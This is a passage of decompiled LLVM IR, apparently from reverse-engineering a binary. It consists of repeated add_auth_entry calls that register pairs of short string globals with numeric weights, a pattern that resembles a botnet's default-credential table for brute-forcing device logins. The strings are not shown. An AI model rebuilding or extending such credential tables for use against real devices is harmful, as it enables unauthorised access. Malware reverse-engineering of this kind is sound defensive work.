  store i32 ptrtoint ([5 x i8]* @global_var_1b51c.262 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fde0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b51c.262 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b524.264 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fdf0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b524.264 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b52c.266 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_fe00 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b52c.266 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b538.268 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fe10 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b538.268 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b548.270 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fe20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b548.270 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b558.272 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe30 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b558.272 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b560.274 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe40 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b560.274 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b568.276 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b568.276 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b574.278 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe70 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b574.278 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b57c.280 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_fe80 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b57c.280 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b588.282 to i32), i32* %r1.global-to-local, align 4
  %v0_fe8c = load i32, i32* @r4, align 4
  store i32 %v0_fe8c, i32* %r2.global-to-local, align 4
  %v4_fe90 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b588.282 to i32), i32 %v0_fe8c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b590.284 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fea0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b590.284 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_feb0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b854.214 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b45c.218 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fec0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b45c.218 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b440.210 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fed0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b440.210 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fee0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b438.208 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b548.270 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fef0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b548.270 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b598.286 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_ff00 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b598.286 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ff10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b4ac.236 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ff20 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b4ac.236 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ff30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5a4.290 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_ff40 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5a4.290 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b5b0.292 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ff50 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b5b0.292 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b5b8.294 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ff60 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b5b8.294 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5bc.296 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_ff70 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5bc.296 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_ff80 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b5d0.300 to i32), i32* %r1.global-to-local, align 4
  %v0_ff8c = load i32, i32* @r4, align 4
  store i32 %v0_ff8c, i32* %r2.global-to-local, align 4
  %v5_ff90 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b5d0.300 to i32), i32 %v0_ff8c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b5d8.302 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_ffa0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b5d8.302 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5e4.304 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ffb0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5e4.304 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5ec.306 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_ffc0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5ec.306 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5f4.308 to i32), i32* %r1.global-to-local, align 4
  %v0_ffcc = load i32, i32* @r4, align 4
  store i32 %v0_ffcc, i32* %r2.global-to-local, align 4
  %v4_ffd0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5f4.308 to i32), i32 %v0_ffcc)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5fc.310 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_ffe0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b5fc.310 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b604.312 to i32), i32* %r1.global-to-local, align 4
  %v0_ffec = load i32, i32* @r4, align 4
  store i32 %v0_ffec, i32* %r2.global-to-local, align 4
  %v5_fff0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b604.312 to i32), i32 %v0_ffec)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b60c.314 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10000 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b60c.314 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b614.316 to i32), i32* %r1.global-to-local, align 4
  %v0_1000c = load i32, i32* @r4, align 4
  store i32 %v0_1000c, i32* %r2.global-to-local, align 4
  %v4_10010 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b614.316 to i32), i32 %v0_1000c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), i32* %r1.global-to-local, align 4
  %v0_1001c = load i32, i32* @r4, align 4
  store i32 %v0_1001c, i32* %r2.global-to-local, align 4
  %v5_10020 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), i32 %v0_1001c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b61c.318 to i32), i32* %r1.global-to-local, align 4
  %v0_1002c = load i32, i32* @r4, align 4
  store i32 %v0_1002c, i32* %r2.global-to-local, align 4
  %v4_10030 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint (i32* @global_var_1b61c.318 to i32), i32 %v0_1002c)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b624.320 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10040 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b624.320 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b62c.322 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10050 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b62c.322 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b638.324 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b638.324 to i32), i32* %r1.global-to-local, align 4
  %v5_10060 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b638.324 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b638.324 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32* %r1.global-to-local, align 4
  %v5_10070 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10080 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b730.326 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10090 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b730.326 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b640.328 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_100a0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b640.328 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_100b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), i32* %r1.global-to-local, align 4
  %v5_100c0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1b650.332 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_100d0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b650.332 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_1b654.334 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b65c.336 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_100e0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b654.334 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b65c.336 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1b664.338 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b664.338 to i32), i32* %r1.global-to-local, align 4
  %v5_100f0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b664.338 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b664.338 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b668.340 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10100 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint (i32* @global_var_1b668.340 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b674.342 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10110 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b778.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b674.342 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), i32* %r0.global-to-local, align 4
  %v0_10118 = load i32, i32* @r4, align 4
  store i32 %v0_10118, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), i32* %r1.global-to-local, align 4
  %v5_10120 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), i32 %v0_10118)
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), i32* %r1.global-to-local, align 4
  %v0_1012c = load i32, i32* @r4, align 4
  store i32 %v0_1012c, i32* %r2.global-to-local, align 4
  %v4_10130 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), i32 %v0_1012c)
  store i32 ptrtoint (i32* @global_var_1b684.346 to i32), i32* %r0.global-to-local, align 4
  %v0_10138 = load i32, i32* @r4, align 4
  store i32 %v0_10138, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b684.346 to i32), i32* %r1.global-to-local, align 4
  %v3_10140 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b684.346 to i32), i32 ptrtoint (i32* @global_var_1b684.346 to i32), i32 %v0_10138)
  store i32 ptrtoint ([6 x i8]* @global_var_1b68c.348 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10150 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b68c.348 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10160 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10170 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10180 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_1b69c.352 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_10190 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b69c.352 to i32), i32 ptrtoint (i32* @global_var_1b3d4.190 to i32), i32 5)
  store i32 ptrtoint ([9 x i8]* @global_var_1b6a4.354 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6b0.356 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_101a0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b6a4.354 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6b0.356 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_1b6b8.358 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b6b8.358 to i32), i32* %r1.global-to-local, align 4
  %v5_101b0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b6b8.358 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b6b8.358 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), i32* %r1.global-to-local, align 4
  %v5_101c0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b6c8.362 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_101d0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b6c8.362 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b6d0.364 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1b6d8.366 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_101e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b6d0.364 to i32), i32 ptrtoint ([10 x i8]* @global_var_1b6d8.366 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1b6d0.364 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b624.320 to i32), i32* %r1.global-to-local, align 4
  %v0_101ec = load i32, i32* @r4, align 4
  store i32 %v0_101ec, i32* %r2.global-to-local, align 4
  %v5_101f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b6d0.364 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b624.320 to i32), i32 %v0_101ec)
